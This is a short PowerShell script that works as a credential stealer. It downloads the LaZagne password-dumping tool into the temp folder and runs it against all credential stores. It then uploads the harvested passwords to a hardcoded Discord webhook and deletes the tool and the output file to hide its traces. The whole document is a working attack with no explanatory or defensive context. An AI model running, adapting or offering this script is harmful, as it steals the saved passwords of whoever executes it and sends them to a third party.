$t=$env:TEMP
Invoke-WebRequest 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe' -OutFile "$t\l.exe"
Start-Sleep -s 5
& "$t\l.exe" all -vv > "$t\pw.txt"
Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1366126236455407616/wHyn4EgoxcqTd8oJaxYeu6yowiF8fXhsJA69OvobS0uu4OBT74OEx_wTvImoIJ34qX5X" -Method Post -InFile "$t\pw.txt" -ContentType "multipart/form-data"
Remove-Item "$t\l.exe","$t\pw.txt" -Force -ErrorAction SilentlyContinue
